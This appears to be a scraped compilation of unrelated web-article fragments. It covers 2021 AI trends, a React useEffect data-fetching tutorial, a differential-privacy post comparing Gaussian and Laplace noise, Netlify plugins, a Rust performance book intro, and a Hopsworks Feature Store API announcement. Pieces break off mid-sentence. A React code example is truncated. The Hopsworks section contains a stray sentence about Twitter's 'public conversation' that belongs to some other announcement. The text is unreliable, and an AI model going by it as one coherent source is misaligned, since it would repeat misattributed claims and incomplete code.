Intelligence Trends to watch in year 2021</strong>. These have the potential to hit great innovation in future. Let's have a look at these strategies:</p><h2 id="1-robotic-process-automation-rpa-">1. &nbsp;Robotic Process Automation (RPA)</h2><p>It's one of the most disruptive AI technologies that help in performing repetitive manual tasks. It can efficiently perform a high-volume, repetitive task on the desktop without creating any mess. The work might be of invoicing a client. For it, the robot opens email via RPA, copy the given data into a CRM database and then collect data from another related database. It replies to that client with new data. Besides, it can perform the given task multiple times in a day and saves human’s time to do some other productive task.</p><p>Robotic Process Automation is a robot that works on using software for performing repetitive manual tasks. If there is something beyond the knowledge of robot, it notifies its owner to step in. in a nutshell, RPA performs the mundane task and give time to people for more exciting work.</p><p>RPA would be in use in billing, invoicing, payroll processing, extracting data, tracking, and shipment scheduling. Its also known as <strong>Hybrid Workforce </strong>that shows the collaboration of human workforce with robots.</p><p><strong>Vanguard </strong>is a financial service providing company that comes <a href="https://about.vanguard.com/who-we-are/fast-facts/">$5.6 trillion</a> in global assets under management department. The company uses <a href="https://www.cio.com/article/3048318/roboadvisors-stand-at-the-vanguard-of-human-machine-collaboration.html">RPA</a> for doing exceptional trading tasks. It works with, "when x happens, do y." However, the RPA system cannot eliminate the need for humans. The combination of humans and technology helps in providing better services to clients and allowing humans to focus on complex tasks.</p><h2 id="2-ai-in-healthcare">2. &nbsp;AI in Healthcare</h2><p>AI is already helping the healthcare industry to a great extent with high accuracy, but further advancements will surprise everyone. AI developing companies are struggling hard to create advanced tools for enhancing the health industry’s capabilities—AI-inspired humans in recovering patients from recent pandemic COVID-19. <a href="https://www.techopedia.com/definition/27745/big-data">Big Data</a> was used to identify COVID Patients and significant hot spots. Moreover, researchers developed thermal cameras and <a href="https://www.techopedia.com/definition/2953/mobile-application-mobile-app">smartphone apps</a> for measuring the temperature of individuals and collecting data for healthcare organizations.</p><p>AI can help healthcare department in many unique ways by using data analysis and predicting different results. AI and ML tools provide insights about human health and also suggest preventive measures to stop the disease spreading. There is another AI trend; AI Watches that can help doctors to track their patient’s health remotely.</p><h3 id="predicting-pandemic-even-before-it-s-start">Predicting Pandemic Even Before It’s Start</h3><p>Now researchers are working on advanced AI algorithms for accurately predicting future outbreaks. Some of the significant research is already done on it that generated some earliest alerts about the current pandemic. In Wuhan, China, the <a href="https://www.cnbc.com/2020/03/03/bluedot-used-artificial-intelligence-to-predict-coronavirus-spread.html"><strong>BlueDot Tool</strong></a><strong> </strong>by Toronto was scanning over 100,000 governmental and media data daily and shared an alert about the potential pandemic.</p><h2 id="3-ai-for-cybersecurity-data-breaches">3. &nbsp;AI for Cybersecurity &amp; Data Breaches</h2><p>The use of advanced AI tools will collect and analyze a wide range of data sets. It will fetch information from news, blogs, websites, and stories to identify all threats. As it collects more data, the system will become more precise.</p><p>In 2021 and beyond, digital data will be at more risk to be hacked and vulnerable to phishing attacks. AI and advanced technologies will provide support to the security department against malicious activities in every field. AI will help to prevent cybercrimes in future with enhanced enterprise <a href="https://thinkml.ai/use-of-artificial-intelligence-in-cybersecurity/">cybersecurity</a> measures. The AI-supported system will spot fake digital activity or transactions that follow criminal patterns.</p><p>Its preventive alarms will protect sensitive data information from data hacking firms. Furthermore, it will take only a few seconds to detect any threatening activity, including suspicious IP addresses. It allows security dealers to respond to these activities faster than usual. Because of its high efficiency and advantages, the demand for AI in cybersecurity will rise in 2021.</p><h2 id="4-natural-language-processing-nlp-">4. &nbsp;Natural Language Processing (NLP)</h2><p>Here machine learning models teach computers to understand what's written or spoken material describing a specific process. It becomes one of the top and highly-demanded application of AI in the present time. The popularity of NLP is rising because of its significant usage as Amazon Alexa and Google Home. NLP eliminated the need for writing or interacting with a screen as now humans interact with robots that understand their language.</p><p>Natural Language Processing comes with two sub-applications.</p><p><strong>Natural Language Understanding: </strong>As its name shows, it enables a machine to review a written text and understands its meaning correctly.</p><p><strong>Natural Language Generation: </strong>It’s a logical response that a machine generates for any given input, for instance, any text.</p><p>The use of NLP will increase in 2021 for sentiment analysis, machine translation, summarizing a process, auto-video caption generation and as chatbots.</p><p>YouTube uses NLP technology in generating captions automatically across its platform. YouTube Video involves a <strong>speech recognition software </strong>that produces video cations. The system used this technology first in 2009 for translation of dozens of languages.</p><h2 id="5-reinforcement-learning">5. &nbsp;Reinforcement Learning</h2><p>Reinforced Learning (RL) is one of the demanded skills of future by different organizations. It's a particular application of deep learning that works based on its experience for improving data's effectiveness. In this learning process, the software is ingested with several different conditions that tell about its specific task performance. Thus, various actions define about self-learned actions of software that it performs to get the final result.</p><p>For instance, <a href="https://www.techopedia.com/definition/16366/chatterbot">Chatbot</a> has information to respond to a general user's queries like greetings, order booking, or consultations calls. <strong>Machine Learning Development Companies </strong>can add sequential conditions in chatbots by using RL. It will make them more productive and helpful in getting more sales and transferring calls to the relevant department. Some other useful applications of RL are robotics in planning business strategies, advertising content optimization, automating industries, controlling aircraft, and making motion control robots. Moreover, it allows personalized recommendations with the optimization of the product's advertising budget.</p><p>Alibaba, an outstanding Chinese e-commerce site, uses Reinforced Learning to boost its return by 24% for online advertisement without rising its budget. The team at Alibaba explained in a <a href="https://arxiv.org/abs/1803.00259">research paper</a> that how they used RL in optimizing <strong>sponsored search campaign. </strong>They created a bidding model for impression every hour and performed real-time bidding with it.</p><h2 id="6-the-joining-of-the-internet-of-things-with-ai-aiot-">6. &nbsp;The Joining of the Internet of Things with AI (AIoT)</h2><p>Internet of Things (IoT) is in use for proper management of interconnected devices. These devices are performing exceptional tasks in different organizations, homes, and companies. However, researchers enhanced the capabilities of IoT devices by coupling them with AI. IoT technology has potential to offer real-time information in software and <a href="https://searchcustomerexperience.techtarget.com/definition/CRM-customer-relationship-management">customer relationship management (CRM)</a>. It will also monitor the performance of several interconnected gadgets.</p><p>These AI-powered smart solutions can be used for high maintenance in industrial devices. It also helps in delivering or discussing problems remotely. AI and IoT, when employed together, will offer an incredible ear for exciting insights. Sensor powered AI will help in bringing predictive maintenance in manufacturing goods. <strong>Smart Home Devices </strong>like <a href="https://nest.com/">Nest</a> (Google's application) will gain popularity. According to an estimation, 28% of the US homes will become smart homes by 2021. It will resultantly boost efficiency to achieve the next level.</p><p>Another example is AI applications allowing field agents to spot faulty machines. It works with image recognition feature embedded in <a href="https://www.damcogroup.com/blogs/field-service-management-software-solution/">Field Service Applications</a>. AIoT supports businesses by detecting defects and providing predictive maintenance.</p><h2 id="7-facial-recognition-a-breakthrough-in-2021">7. &nbsp;Facial Recognition- A Breakthrough in 2021</h2><p>Because of the current COVID-19 issues, facial recognition technology will grow at a rapid pace in 2021. &nbsp;It identifies facial features from images and videos by using biometrics and then compare this information with the already available database.</p><p>Facebook is a social platform that uses Depp Face Program in tagging family members and friends in a photo.

November 17, 2020 | https://maxrozen.com/fetching-data-react-with-useeffect/ | <a href="https://web.archive.org/web/*/https://maxrozen.com/fetching-data-react-with-useeffect/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>So you’re building a component, and need to fetch some data from an API before rendering your component. You’ve been told that useEffect is <em>the way</em> for fetching data, but all you can find is discussion about side-effects (particularly in the official <a href="https://reactjs.org/docs/hooks-reference.html#useeffect">useEffect docs</a>).</p>
<p>Let’s unpack what side-effects are, and fetch ourselves some data.</p>
<h2 id="what-are-side-effects"><a href="#what-are-side-effects" aria-label="what are side effects permalink"></a>What are side-effects?</h2>
<p>To talk about side-effects, we should probably first talk about <b>pure functions</b>.</p>
<p>A pure function is a function, that when given an input, will always returns the same output. Pure functions also don’t modify the arguments passed to them.</p>
<p>While you can have pure functions as simple as this:</p>
<div data-language="js"><pre><code><span>function</span> <span>myPureFunction</span><span>(</span><span>count</span><span>)</span> <span>{</span>
  <span>return</span> count <span>+</span> <span>1</span><span>;</span>
<span>}</span></code></pre></div>
<p>We can also have pure functions that return JSX in React:</p>
<div data-language="jsx"><pre><code><span>function</span> <span>MyComponent</span><span>(</span><span>props</span><span>)</span> <span>{</span>
  <span>return</span> <span><span><span>&lt;</span>div</span> <span>className</span><span><span>=</span><span>{</span>props<span>.</span>className<span>}</span></span><span>&gt;</span></span><span>Some content goes here</span><span><span><span>&lt;/</span>div</span><span>&gt;</span></span><span>;</span>
<span>}</span></code></pre></div>
<p>Side-effects then, are operations that change things outside of your function, making the function impure.</p>
<p>Fetching data from an API, communicating with a database, and sending logs to a logging service are all considered side-effects, as it’s possible to have a different output for the same input. For example, your request might fail, your database might be unreachable, or your logging service might have reached its quota.</p>
<p>This is why useEffect is the hook for us - by fetching data, we’re making our React component impure, and useEffect provides us a safe place to write impure code.</p>
<h2 id="fetching-data"><a href="#fetching-data" aria-label="fetching data permalink"></a>Fetching data</h2>
<p>Here’s how to use useEffect to <em>only</em> fetch data (there are a few more steps to make it useful):</p>
<div data-language="jsx"><pre><code><span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>const</span> <span>fetchData</span> <span>=</span> <span>async</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>const</span> response <span>=</span> <span>await</span> <span>fetch</span><span>(</span><span><span>`</span><span>https://swapi.dev/api/people/1/</span><span>`</span></span><span>)</span><span>;</span>
    <span>const</span> newData <span>=</span> <span>await</span> response<span>.</span><span>json</span><span>(</span><span>)</span><span>;</span>
  <span>}</span><span>;</span>

  <span>fetchData</span><span>(</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>;</span></code></pre></div>
<p>You might notice a few things are missing from this example:</p>
<ul>
<li>we’re not doing anything with the data once we fetch it</li>
<li>we’ve hardcoded the URL to fetch data from</li>
</ul>
<p>To make this useEffect useful, we’ll need to:</p>
<ul>
<li>update our useEffect to pass a prop called <code>id</code> to the URL,</li>
<li>use a <a href="https://maxrozen.com/learn-useeffect-dependency-array-react-hooks/">dependency array</a>, so that we only run this useEffect when <code>id</code> changes, and then</li>
<li>use the useState hook to store our data so we can display it later</li>
</ul>
<div data-language="jsx"><pre><code><span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>const</span> <span>fetchData</span> <span>=</span> <span>async</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>

<p>Now let’s build the rest of the component. It needs to:</p>
<ul>
<li>store our fetched data using useState</li>

<li>render nothing if we don’t have data</li>
</ul>

<p>You might find fetching data in this way results in quite a bit of repeated code, especially if you’re using <code>fetch</code>, and handle error and loading states. To avoid this, a common solution is to <a href="https://reactjs.org/docs/hooks-custom.html#extracting-a-custom-hook">write a custom hook</a>.</p>
<p>If you also want caching (to avoid requesting the same data twice), I highly recommend looking into one of these <a href="https://maxrozen.com/keeping-up-with-react-libraries/#data-fetching-libraries">data fetching libraries</a> instead.</p></div></div>]]>

</small></p>
<hr>
<p><span>P</span><strong>reviously</strong>, we used Gaussian noise to explain
the <a href="https://desfontain.es/privacy/privacy-loss-random-variable.html">real meaning of <span>\(\delta\)</span></a> in <span>\((\varepsilon,\delta)\)</span>-differential
privacy. One question was left unanswered: why would anyone use Gaussian noise
in the first place? The guarantees it provides aren't as strong: it gives
<span>\((\varepsilon,\delta)\)</span>-DP with <span>\(\delta&gt;0\)</span>, while Laplace noise provides pure
<span>\(\varepsilon\)</span>-DP. This blog post gives an answer to this question, and describes
the situations in which Gaussian noise excels.</p>

<p>A first advantage of Gaussian noise is that the distribution itself behaves
nicely. It's called the <a href="https://en.wikipedia.org/wiki/Normal_distribution"><em>normal</em> distribution</a> for a reason: it has
convenient properties, and is very widely used in natural and social sciences.
People often use it to model random variables whose actual distribution is
unknown. If you sum many independent random variables, you <a href="https://en.wikipedia.org/wiki/Central_limit_theorem">end up with a normal
distribution</a>. And these are just a few of the <a href="https://en.wikipedia.org/wiki/Normal_distribution#Properties">many
properties</a> of this fundamental distribution. Thus, most data
analysts and scientists are already familiar with Gaussian noise. It's
convenient when you release anonymized statistics: analysts don't need to learn
too many new concepts to understand what you're doing to protect the data.</p>
<p>A second advantage is that the Gaussian distribution has nice, <em>thin</em> tails. The
vast majority of its probability mass is focused around its mean. Take a normal
distribution with mean 0 and standard deviation <span>\(\sigma\)</span>. The <a href="https://en.wikipedia.org/wiki/68%E2%80%9395%E2%80%9399.7_rule">68–95–99.7
rule</a> says that a random variable sampled from this distribution will be:</p>
<ul>
<li>in <span>\([-\sigma,\sigma]\)</span> with 68% probability;</li>
<li>in <span>\([-2\sigma,2\sigma]\)</span> with 95% probability;</li>
<li>and in <span>\([-3\sigma,3\sigma]\)</span> with 99.7% probability.</li>
</ul>
<p>It even gets better as you go further away from the mean. The probability that
the random variable is <em>outside</em> <span>\([-k\sigma,k\sigma]\)</span> decreases faster than
<span>\(e^{-k^2/2}\)</span>. In practice, you're rarely surprised by the values that a Gaussian
distribution takes. Even if you sample <span>\(1,000,000\)</span> values, they are all probably
going to be within <span>\([-5\sigma,5\sigma]\)</span>.</p>
<p>Laplace, by comparison, isn't quite as nice. Its tails decrease exponentially fast,
but that's still much slower than Gaussian's. Suppose you sample <span>\(1,000,000\)</span>
values from a Laplace distribution of standard deviation <span>\(\sigma\)</span>. On average,
<strong>849</strong> of them will be outside <span>\([-5\sigma,5\sigma]\)</span>.</p>
<p>OK, so Gaussian noise is nice. But that does not change a simple fact: to get
a comparable level of privacy for a single statistic, Laplace is much better.
Assume that we're adding noise to a simple count, of sensitivity <span>\(1\)</span>. This graph
compares the Laplace noise needed to get <span>\(\varepsilon=1\)</span>, and Gaussian noise
needed to get <span>\(\varepsilon=1\)</span> and <span>\(\delta=10^{-5}\)</span>.</p>
<center>
<img alt="Graph showing a Laplace distribution with scale 1/ln(3) and a Gaussian distribution of standard deviation 3.426, both centered on 0" src="https://desfontain.es/privacy/images/laplace-gaussian-ln-3.svg">
</center>
<p>Despite its weaker privacy guarantees, the Gaussian distribution is much
flatter. Its standard deviation is over 3.4, while Laplace's is less than 1.3.
Thus, much more noise will need to be added, and analysts mainly care about
minimizing the noise. Why, then, would Gaussian noise be a good option? The answer
is simple: because it gets better when you're publishing a lot of statistics.</p>

<p>In most of our <a href="https://desfontain.es/privacy/differential-privacy-in-practice.html">previous examples</a>, we assumed that each individual
appeared in a <em>single</em> statistic. This case is common, for example when
partitioning individuals based on demographic information. But in many
applications, this assumption does not hold. Imagine, for example, that you want
to answer the question: «&nbsp;what type of specialized physicians did people visit
in the past 10 years?&nbsp;»</p>
<p>Assume we're working in the <a href="https://desfontain.es/privacy/local-global-differential-privacy.html">central model</a>. We have a dataset of 〈user
id, specialist type〉 pairs, and each record corresponds to an individual
visiting a specialized physician (cardiologist, dermatologist, radiologist,
etc.). We want to count the number of unique user IDs per specialty.</p>
<p>Note that each user can only influence a single count <em>once</em>. We count
<em>distinct</em> user IDs: if you visit dermatologists 10 times, you will only add 1
to the "dermatologist" count. However, a single user might visit many types of
specialized physicians. There are <a href="https://en.wikipedia.org/wiki/Medical_specialty">many kinds of
specialties</a>, and a single user
might influence all the counts. Say there are 50 of them.</p>
<p>How to make these counts differentially private? A first solution is to <a href="https://desfontain.es/privacy/differential-privacy-in-practice.html#multiple-statistics"><em>split
the privacy budget</em></a> across all the counts. Here, we can
split our privacy budget in 50. If we want to achieve <span>\(\varepsilon=1\)</span>, we
compute <span>\(\varepsilon'=1/50=0.02\)</span>, and add Laplace noise of scale
<span>\(1/\varepsilon'=50\)</span> to all the counts.</p>
<p>Unfortunately, this is a lot of noise.</p>
<center>
<img alt="Graph showing a Laplace distribution with scale 0.02, centered on 0" src="https://desfontain.es/privacy/images/laplace-0.02.svg">
</center>
<p>Fortunately, this is exactly the kind of situation in which Gaussian noise
shines. When a single user can impact <span>\(k\)</span> distinct statistics, we need to scale
Laplace noise by <span>\(k\)</span>. By contrast, Gaussian noise must only be scaled by
<span>\(\sqrt{k}\)</span>. Comparing the two gives a much more flattering view of Gaussian's power.</p>
<center>
<img alt="Graph showing a Laplace distribution with scale 0.02, and a Gaussian distribution of standard deviation 26.38, both centered on 0" src="https://desfontain.es/privacy/images/gaussian-laplace-50.svg">
</center>
<p>OK, so that's the general idea. Now, <em>why</em> does that happen? How come
composition doesn't seem to behave in the same way for Laplace and Gaussian? To
understand this better, we'll first introduce the concept of <em>sensitivity</em>.</p>

<p>Consider our example above. For each type of specialized physician, we count the
people who consulted with one. But we won't consider this histogram as 50
different counting queries. Instead, we'll consider it as a <em>single</em> function,
with values in <span>\(\mathbb{N}^{50}\)</span>. It outputs a <em>vector</em>: a list of 50
coordinates, each of which corresponds to a fixed specialty. How to make such a
function <span>\(f\)</span> differentially private? We'll add noise, scaled by the function's
<em>sensitivity</em>.</p>
<p>The sensitivity of a function measures how much its output can change when you
add one record in the database. If the function returns a single number, we
measure the <em>absolute value</em> of the difference: the sensitivity of <span>\(f\)</span> is the
maximum value of <span>\(\left|f\left(D_1\right)-f\left(D_2\right)\right|\)</span>. We already
encountered the sensitivity before: when <a href="https://desfontain.es/privacy/differential-privacy-in-practice.html#counting-things">counting things</a>, if each user
can change the statistic by more than <span>\(1\)</span>, we needed to scale the noise
accordingly. The same happened for sums.</p>
<p>Here, the function <span>\(f\)</span> returns a vector. How do we measure the distance between
two vectors? We have a few options. We could use the <a href="https://en.wikipedia.org/wiki/Taxicab_geometry">Manhattan
distance</a>, or the <a href="https://en.wikipedia.org/wiki/Euclidean_distance">Euclidean distance</a>, or even <a href="https://en.wikipedia.org/wiki/Norm_(mathematics)#p-norm">weirder
stuff</a>. As it turns out, the distance we need to use depends on which noise
function we're adding. Laplace noise is scaled by the <span>\(L^1\)</span>-sensitivity, itself
based on the Manhattan distance. Here is its definition, denoting by <span>\(f_i(D)\)</span>
the <span>\(i\)</span>-th coordinate of <span>\(f(D)\)</span>:</p>
<p>$$
\Delta_1(f) = \max \sum_{i=1}^{50} \left|f_i\left(D_1\right)-f_i\left(D_2\right)\right|
$$</p>
<p>where the <span>\(\max\)</span> is taken over <span>\(D_1\)</span>
and <span>\(D_2\)</span> differing in a single record. This is easy to understand: you just sum
the sensitivities for each coordinate. For our function <span>\(f\)</span>, we have
<span>\(\Delta_1(f)=50\)</span>: Laplace noise needs to be scaled by 50. You might have noticed
that this is equivalent to using simple composition: the scale of Laplace noise
is <span>\(\Delta_1/\varepsilon\)</span>, so dividing <span>\(\varepsilon\)</span> by <span>\(50\)</span> is the same as
considering all coordinates together.</p>
<p>By contrast, Gaussian noise needs to be scaled by the <span>\(L^2\)</span>-sensitivity. This
type of sensitivity is based on the Euclidean distance, and defined by:</p>
<p>$$
\Delta_2(f) = \max \sqrt{\sum_{i=1}^{50} {\left|f_i\left(D_1\right)-f_i\left(D_2\right)\right|}^2}
$$</p>
<p>still taking the <span>\(\max\)</span> over <span>\(D_1\)</span> and
<span>\(D_2\)</span> differing in a single record. This formula might look complicated, but the
Euclidean distance is a simple concept: it's the length of a straight line
between two points. If you only have two dimensions, this formula might be
reminiscent of the <a href="https://en.wikipedia.org/wiki/Pythagorean_theorem">Pythagorean theorem</a>!</p>
<p>The standard deviation <span>\(\sigma\)</span> of Gaussian noise will be proportional to
<span>\(\Delta_2(f)\)</span>. Let's compute this value for our function. Each user can change a
single count by at most one, and each can change all counts. Thus:</p>
<p>$$
\Delta_2(f) = \sqrt{\sum_{i=1}^{50} 1^2} = \sqrt{50} \approx 7.07.
$$</p>
<p>The noise scales with the <em>square root</em> of the number of counts. This is key to
Gaussian's superiority in such situations: the <span>\(L^2\)</span>-sensitivity grows much more
slowly than the <span>\(L^1\)</span> sensitivity. As a result, scaling the noise by the
sensitivity hurts accuracy much less. Of course, using Gaussian gives you
<span>\((\varepsilon,\delta)\)</span>-DP, not pure DP, so there is still a tradeoff. As we saw
in the <a href="https://desfontain.es/privacy/privacy-loss-random-variable.html">previous article</a>, this isn't a super scary <span>\(\delta\)</span>, so it's
generally worth it.</p>
<p><a href="https://arxiv.org/abs/1805.06530">This paper</a> (Theorem 8) gives the exact
formula for calibrating Gaussian noise depending on <span>\(\Delta_2(f)\)</span>, <span>\(\varepsilon\)</span>
and <span>\(\delta\)</span>. You need to pick <span>\(\sigma\)</span> such that the following equality holds:</p>
<p>$$
  g\left(\frac{\Delta_2(f)}{\sigma},\varepsilon\right) = \delta
$$</p>
<p>where <span>\(g\)</span> is a complicated function. As
you can see, increasing <span>\(\Delta_2(f)\)</span> and <span>\(\sigma\)</span> simultaneously has no effect:
<span>\(\sigma\)</span> is proportional to <span>\(\Delta_2(f)\)</span>. There is no analytic form for
<span>\(\sigma\)</span>, but since <span>\(g\)</span> is monotonic, you use e.g. a binary search to
approximate its value. If you want to know the exact formula, click here:

<p>Now, why do these two noise distributions work so differently? Rather than
proving this formally, …</p></div></div>

The key to achieving a great web experience is making sure that your website is optimized and tested thoroughly. Testing a small website manually can be easy but a large website that is controlled by a team through a CMS requires automated tools. These days most website owners are shifting towards JAMstack. Netlify is one of the best platforms to host JAMstack websites. In this blog, we will list some of the best Netlify plugins that you can use to offer a great web experience to your viewers.</p><h2 id="1-checklinks"><a href="https://github.com/munter/netlify-plugin-checklinks">1. Checklinks</a></h2><p>Broken links on your website can result in embarrassment and a huge dropout rate. You can manually check broken links on your website but it is better if we can automate the process. <strong>Checklinks</strong> helps to keep all the assets references correct and avoid 404 links to the internal pages, as well as the external pages your website links to. It can also report on inefficient redirect chains and potential mixed content warnings.</p><h2 id="2-deployment-hours"><a href="https://github.com/neverendingqs/netlify-deployment-hours-plugin">2. Deployment Hours</a></h2><p>Sometimes, in the middle of the night, one of your team members can trigger a new deployment which can by chance break the website. What next? Your team members are called and you have to fix the bug at the time you were about to sleep. So to blocks deployments that happen outside of the specified deployment hours range, you can use the <strong>Deployment Hours</strong> Netlify plugin.</p><h2 id="3-html-validate"><a href="https://github.com/oliverroick/netlify-plugin-html-validate">3. HTML Validate</a></h2><p><strong>HTML Validate</strong> Netlify plugin allows you to validate your HTML website build. It is extremely important to test the validity of the HTML because not only it can break your website’s design structure but also affect the SEO as the GoogleBot won’t be able to parse your website correctly. For example,</p><div><div><pre><code><span>&lt;p&gt;</span>
  <span>&lt;button&gt;</span>Click me!<span>&lt;/button&gt;</span>
  <span>&lt;div</span> <span>id=</span><span>"show-me"</span><span>&gt;</span>
    Lorem ipsum
  <span>&lt;/div&gt;</span>
<span>&lt;/p&gt;</span>
</code></pre></div></div><p>The validation of the above HTML will produce the following error in the terminal:</p><pre><code>1:1  error  Element &lt;p&gt; is implicitly closed by adjacent &lt;div&gt;  no-implicit-close
2:2  error  Button is missing type attribute                    button-type
6:4  error  Unexpected close-tag, expected opening tag          close-order
</code></pre><h2 id="4-lighthouse"><a href="https://github.com/netlify-labs/netlify-plugin-lighthouse">4.

<p>Performance is important for many Rust programs. </p>
<p>This book contains many techniques that can improve the performance—speed and
memory usage—of Rust programs. The <a href="https://nnethercote.github.io/perf-book/compile-times.html">Compile Times</a> section also contains some
techniques that will improve the compile times of Rust programs. Some of the
book’s techniques only require changing build configurations, but many require
changing code.</p>
<p>Some of the techniques within are entirely Rust-specific, and some involve
ideas that can be applied (often with modifications) to programs written in
other languages. The <a href="https://nnethercote.github.io/perf-book/general-tips.html">General Tips</a> section also includes some general
principles that apply to any programming language. Nonetheless, this book is
mostly about the performance of Rust programs and is no substitute for a
general purpose guide to profiling and optimization.</p>
<p>The book also focuses on techniques that are practical and proven: many are
accompanied by links to pull requests or other resources that show how the
technique was used on a real-world Rust program.</p>
<p>This book is aimed at intermediate and advanced Rust users. Beginner Rust users
have more than enough to learn and these techniques are likely to be an
unhelpful distraction to them.</p>

November 17, 2020 | https://www.logicalclocks.com/blog/hopsworks-feature-store-api-2-0 | <a href="https://web.archive.org/web/*/https://www.logicalclocks.com/blog/hopsworks-feature-store-api-2-0">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><p>TLDR; <a href="http://www.hopsworks.ai/" target="_blank">Hopsworks Feature Store</a> interacts with the new Python and Scala/Java Software Development Kit (SDK) available in Hopsworks 2.0. The new SDK builds on our extensive experience working with Enterprise customers and users with Enterprise requirements. With this new release, we consolidate multiple libraries with a single one. We named it `HSFS` (HopsworkS Feature Store) and in this blog post we will be looking at some of the improvements and key features that the new SDK brings.</p><p>Today, we’re introducing the new Hopsworks Feature Store API. Rebuilt from the ground up, today’s release includes the first set of new endpoints and features we’re launching so developers can help the world connect to the public conversation happening on Twitter.&nbsp;</p><p>If you can’t wait to check it out, <a href="https://www.hopsworks.ai/" target="_blank">visit Hopsworks.ai</a> to get started. If you can, then read on for more about what we’re building, what’s new about the Feature Store API v2.<br></p><h2>Rethinking the Hopsworks Feature Store API</h2><p>The Hopsworks Feature Store was <a href="https://www.logicalclocks.com/blog/feature-store-the-missing-data-layer-in-ml-pipelines" target="_blank">first released at the end of 2018</a>, and it included a new type of Feature Store API based on the FeatureGroup (DataFrame). When designing the Hopsworks Feature Store, we looked at existing feature stores (<a href="https://eng.uber.com/michelangelo-machine-learning-platform/" target="_blank">Michelangelo</a> by Uber and <a href="https://databricks.com/session/zipline-airbnbs-machine-learning-data-management-platform" target="_blank">Zipline</a> by AirBnb) that provided Domain Specific Language (DSL) APIs to their Feature Stores - you declaratively define features, and the DSL is then executed to ingest feature data into the Feature Store. However, we were building a general-purpose Feature Store and we knew that history has not been kind to DSLs - they have their day in the sun, but general purpose frameworks and languages win out in the long-run. So, we went with the FeatureGroup (DataFrames in Spark or Pandas) as the way to ingest and export features to/from the Hopsworks Feature Store. Since then, other Feature Stores have followed our approach, such as Feast that introduced <a href="https://github.com/feast-dev/feast/releases/tag/v0.3.0" target="_blank">FeatureSets in 0.3</a> almost 1 year later and <a href="https://github.com/feast-dev/feast/releases/tag/v0.8.0" target="_blank">Spark support</a> almost 2 years later).&nbsp;</p><p>However, our API still encouraged developers to think of features as existing in a flat namespace. With great customers, such as <a href="https://www.paddypower.com/bet" target="_blank">PaddyPower</a>, we rethought and redesigned our Feature Store API to consider other practical problems we encountered, such as making breaking changes to FeatureGroup schemas without breaking existing feature pipelines, handling feature naming conflicts, and redesigning a minimal single client library (from 2 libraries previously) that can run in either a (Py)Spark or Python environment. That library is now released as our new Feature Store API and is called <a href="https://github.com/logicalclocks/feature-store-api" target="_blank">HSFS</a>.<br></p><h2>Feature Reuse with Pandas-like Joins</h2><p>HSFS provides a DataFrame API to ingest data into the Hopsworks Feature Store. You can also retrieve feature data in a DataFrame, that can either be used directly to train models or materialized to file(s) for later use to train models</p><p>The idea of the Feature Store is to have pre-computed features available for both training and serving models. The key functionality required to generate training datasets from reusable features are: feature selection, joins, filters and point in time queries. To enable this functionality, we are introducing a new expressive Query abstraction with HSFS that provides these operations and guarantees reproducible creation of training datasets from features in the Feature Store.&nbsp;</p><p>The new joining functionality is heavily inspired by the APIs used by Pandas to merge DataFrames. The APIs allow you to specify which features to select from which feature group, how to join them and which features to use in join conditions.</p><p>If a data scientist wants to modify a new feature that is not available in the Feature Store, she can write code to compute the new feature (using existing features or external data) and ingest the new feature values into the Feature Store. If the new feature is based solely on existing feature values in the Feature Store, we call it a <em>derived feature</em>. The same HSFS APIs can be used to compute derived features as well as features using external data sources.</p><div><p># create a query<br>feature_join = rain_fg.select_all()<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.join(temperature_fg.select_all(), on=["date", "location_id"])<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.join(location_fg.select_all())</p><p>td = fs.create_training_dataset("rain_dataset",<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;version=1,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;label=”weekly_rain”, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; data_format=”tfrecords”)</p><p># materialize query in the specified file format<br>td.save(feature_join)</p><p># use materialized training dataset for training, possibly in a different environment<br>td = fs.get_training_dataset(“rain_dataset”, version=1)</p><p># get TFRecordDataset to use in a TensorFlow model<br>dataset = td.tf_data().tf_record_dataset(batch_size=32, num_epochs=100)</p><p># reproduce query for online feature store and drop label for inference<br>jdbc_querystring = td.get_query(online=True, with_label=False)</p></div><p>When using HSFS to create a training dataset, the features, their order and how the feature groups are joined is also saved as metadata. This metadata is then used at serving time to build a JDBC query that is executed by a client (along with the feature group primary key values) to request a feature vector from the online Feature Store for a specific model.<br></p><h2>Features belong in a hierarchical namespace</h2><p>When we started building the Hopsworks Feature Store we wanted to create a flat namespace for features to make it easier for data scientists to pick the features they wanted. But as soon as our customers started having tens of thousands of features in the feature store, feature naming conflicts became commonplace.&nbsp;</p><p>Features like <em>created_on, customer_id, account_id, </em>are often used in many different unrelated Feature Groups. The same user might, for example, have a different account_id for each service the company provides.Imagine an e-commerce use case - most likely you will have multiple `created_on` or 